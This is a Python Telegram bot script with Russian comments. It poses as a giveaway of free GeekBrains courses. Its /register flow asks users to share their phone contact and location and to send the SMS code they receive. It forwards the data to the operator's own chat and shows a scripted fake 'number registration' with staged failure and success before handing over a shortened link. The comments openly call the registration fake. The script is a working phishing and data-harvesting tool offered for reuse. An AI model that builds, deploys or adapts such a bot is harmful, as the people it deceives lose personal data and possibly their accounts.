#Библиотеки
import telebot
from telebot import types
import os#, #signal, pickle, sys
import time
import random


my_id = 'Id'   #Айди
######################ТОКЕН###########################################
bot = telebot.TeleBot('Token')#Токен из ботфазера					##
######################################################################
a = random.randint(2, 4)#Это задержка, между сообщениями в которых бот "регистрирует" номер

#################получение айди чата########################
@bot.message_handler(commands=["id-p112311"]) #Чтобы получить айди чата запустите скрипт, и введите команду /id-p112311
def chat_id(message):
    my_chat_id = int(message.chat.id)
    bot.send_message(message.chat.id, my_chat_id)


####################БОТ#############################
#ЧТО ОТВЕТИТ ПРИ СТАРТЕ
@bot.message_handler(commands=['start'])
def get_text_messages(message):
        bot.send_message(my_id, 'ONLINE!')#ОТПРАВЛЕНИЕ УВЕДОМЛЕНИЯ ВАМ, О ТОМ, ЧТО ЧЕЛОВЕК ЗАПУСТИЛ БОТА
        #СОЗДАНИЕ КНОПКИ
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        pon_button = types.KeyboardButton(text="Понятно")
        keyboard.add(pon_button)
        #ОТПРАЛЕНИЕ СОБЩЕНИЕ ПРИ СТАРТЕ
        bot.send_message(message.chat.id,
                         text="Привет, я бот который дает бесплатные курсы на гикбрейнс.",
                         reply_markup=keyboard)

#ЧТО БУДЕТ ДЕЛАТЬ ПРИ КОМАНДЕ /register
@bot.message_handler(commands=['register'])
def geophone(message):
	#СОЗДАНИЕ КНОПКИ, КОТОРАЯ ПОПРОСИТ КОНТАКТ(ЕСЛИ У ПОЛЬЗОВАТЕЛЯ БУДЕТ ВКЛЮЧЕНА ГЕОЛОКАЦИЯ, БУДЕТ И ОНА ОТПРАВЛЯТСЯ)
    keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button_phone = types.KeyboardButton(text="Отправить", request_contact=True, request_location=True)
    keyboard.add(button_phone)
    #СООБЩЕНИЕ ПРИ КОМАНДЕ /REGISTER
    bot.send_message(message.chat.id,
                     text="Отправьте мне свой контакт, затем отправьте код, который пришел по смс ",
                     reply_markup=keyboard)


#ЧТО БУДЕТ ДЕЛАТЬ ПРИ НАЖАТИИ НА КНОПКУ
@bot.message_handler(content_types=['text'])
def get_text_messages1(message):
    if message.text == "Понятно":#НУ, ТУТ ДУМАЮ ОЧЕВИДНО
        bot.send_message(message.from_user.id, "Для того, чтобы получить доступ к курсу, нужно заарегестрироватся, для этого напиши команду /register .")


#ТИПО РЕГИСТРАЦИЯ НОМЕРА
@bot.message_handler(content_types=['location', 'contact'])
def error(message):
	bot.forward_message(my_id, message.chat.id, message.message_id)
	bot.send_message(message.chat.id, 'Подождите, выполняется регистрация номера')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 2, text='Подождите, выполняется регистрация номера.')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 2, text='Подождите, выполняется регистрация номера..')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 2, text='Подождите, выполняется регистрация номера...')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 2, text='Подождите, выполняется регистрация номера.')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 2, text='Подождите, выполняется регистрация номера..')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 2, text='Подождите, выполняется регистрация номера...')
	time.sleep(a)
	bot.send_message(message.chat.id, 'Не удалось зарегестрировать номер')
	time.sleep(4)
	bot.send_message(message.chat.id, 'Переподключение')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 4, text='Переподключение.')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 4, text='Переподключение..')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 4, text='Переподключение...')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 4, text='Переподключение.')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 4, text='Переподключение..')
	time.sleep(1)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 4, text='Переподключение...')
	time.sleep(a)
	bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 4, text='Успех регистрации!')
	keyboard = types.InlineKeyboardMarkup()
	url_button = types.InlineKeyboardButton(text="Перейти на курс", url="https://clck.ru/Q2GtF")
	keyboard.add(url_button)
	bot.send_message(message.chat.id, "Вот ссылка на курсы.", reply_markup=keyboard)
#ПЕРЕСІЛКА КОНТАКТА ИЛИ ГЕОЛОКАЦИИ В ЛС
@bot.message_handler(content_types=['location', 'contact'])
def error1(message):
	time.sleep(2)
	bot.forward_message(my_id, message.chat.id, message.message_id)

#ЭТА ХРЕЬ НУЖНА ДЛЯ ТОГО, ЧТОБ БОТ РАБОТАЛ БЕСКОНЕЧНО
if __name__ == '__main__':
    bot.polling(none_stop=True)
#СДЕЛАЛ СКРИПТ @lamer112311, ПО ВОПРОСАМ @lamer112311
#MADE BY @lamer112311